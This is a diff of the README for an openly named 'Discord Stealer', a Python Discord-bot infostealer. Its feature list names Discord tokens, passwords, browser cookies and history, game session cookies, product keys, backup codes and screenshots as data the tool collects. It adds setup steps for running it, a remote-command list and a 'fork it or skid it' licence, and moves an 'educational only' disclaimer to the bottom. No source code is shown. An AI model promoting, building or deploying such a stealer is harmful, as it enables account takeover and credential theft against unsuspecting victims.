@@ -1,24 +1,17 @@
-# [ItzRealAnonomyous Discord Stealer 📁]
-
-![Stealer Logo](https://github.com/user-attachments/assets/2ce8219a-9ac9-4e70-8a68-116a8937a21e)
-
-
-🔴## Disclaimer
-**This project is intended for educational and research purposes only. It is designed to demonstrate the potential vulnerabilities and dangers of data exfiltration. Use it responsibly and with explicit consent. Misuse of this code could lead to severe legal and ethical consequences.**
-
-**Do not use this tool to target individuals or systems without their explicit permission.**
 
 ## Overview
 
-This repository contains code that illustrates how various types of sensitive user information can be collected and transmitted. The primary purpose of this project is to educate users about the risks associated with such technologies and to highlight potential attack vectors.
+   This is a single made project by sincerly myself it is written in python only, i did not steal or fork any code in this so this has taken a extreme amount
+of time and if you are willing PLEASE share your ideas, im so out of ideas/inspiration i cant think of what to add to this amazing project. This was just a tool for fun to see how far i could 
+get and after finishing the code ive made this is a hobby, i really enjoy coding this and i plan to keep doing that fixing bugs and updating it on the regular thanks enjoy.
    
 ## Features 
-📘                🟢*   **Information Acquisition:**
+ℹ️                🔵*   **Information Acquisition:**
                                               
         *   Discord Information: User token, password, email
         *   Browser Data: Cookies, Passwords, History
         *   Game Data: Minecraft Session Info, Roblox Cookie, etc.
-        *   System Information:
+        *   System Information: libaries, Tasks
         *   User: Username
         *   OS: Operating system details
         *   System: System Architecture
@@ -29,12 +22,6 @@ This repository contains code that illustrates how various types of sensitive us
         *   Product Key
         *   Other Data: Back up codes and general functions
         *   Screenshot: Desktop screenshot
-        *   User Token
-        *   Password
-        *   Email
-        *   Tasks
-        *   libaries
-        *   shutdown
 
 
 
@@ -58,23 +45,27 @@ This repository contains code that illustrates how various types of sensitive us
           /screenshot: Take a screenshot.
           /restart: Restarts the bot.
 ```
-        
+ Installation/Guide📘
+       
 1.  Ensure you have Python installed with pip. You can download it from [python.org](https://www.python.org/).⬇️
- 
-3.  Install the required dependencies using pip:🟩
+
+
+3.  Install the required dependencies using pip:🟦
     ```
     pip install discord.py python-dotenv cryptography pyautogui 
     ```
 5.  Create a `.env` file and set the `BOT_TOKEN`  text variable with your bot token (discord app bot).📄
+ 
    
-7.  Run the Python script, open terminal in admin accese then do cd C:\Users\User\downloads\ItzRealStealer (use your directory)
+7.  Run the Python script, open terminal in admin accese then do cd C:\Users\User\downloads\ItzRealStealer (use your directory) 📂
+ 
   
-8: Change the directory to were your file is located
+8: Change the directory to were your file is located🤖
       ```
     cd C:\Users\User\downloads\ItzRealSteale
       ```
 
-9:Run the code and make sure it dosent have any errors if it dose look at the crash.txt
+9:Run the code and make sure it dosent have any errors if it dose look at the crash.txtℹ️
 ```
    python main.py
 ```
@@ -85,3 +76,8 @@ This repository contains code that illustrates how various types of sensitive us
 [Free use dont share it unresponibily you can fork it or skid it idc.]
 
 ---
+
+🔴## Disclaimer
+**This project is intended for educational and research purposes only. It is designed to demonstrate the potential vulnerabilities and dangers of data exfiltration. Use it responsibly and with explicit consent. Misuse of this code could lead to severe legal and ethical consequences.**
+
+**Do not use this tool to target individuals or systems without their explicit permission.**
